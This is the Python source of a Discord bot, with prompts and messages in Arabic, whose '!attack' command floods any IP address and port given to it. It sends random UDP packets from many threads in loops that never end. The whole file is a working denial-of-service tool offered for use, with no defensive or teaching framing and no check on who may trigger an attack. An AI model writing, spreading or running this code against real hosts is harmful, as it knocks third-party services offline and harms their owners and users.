import os
import random
import threading
import socket
from discord.ext import commands

TOKEN_FILE = "token.txt"

def get_token():
    if os.path.isfile(TOKEN_FILE):
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
            if token:
                return token
    token = input("يرجى إدخال توكن البوت لتشغيله: ")
    with open(TOKEN_FILE, "w") as f:
        f.write(token)
    return token

TOKEN = get_token()

bot = commands.Bot(command_prefix="!")

def udp_attack(ip, port, times):
    data = random._urandom(1460)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (ip, port)
    for _ in range(times):
        try:
            sock.sendto(data, addr)
        except:
            pass

@bot.event
async def on_ready():
    print(f"البوت شغال كـ {bot.user}")

@bot.command()
async def attack(ctx, ip: str, port: int, times: int, threads_count: int):
    await ctx.send(f"بدأ الهجوم على {ip}:{port} - عدد الحزم: {times} - الخيوط: {threads_count}")
    
    def run():
        while True:
            udp_attack(ip, port, times)
    
    for _ in range(threads_count):
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()
    
    await ctx.send("الهجوم بدأ!")

bot.run(TOKEN)
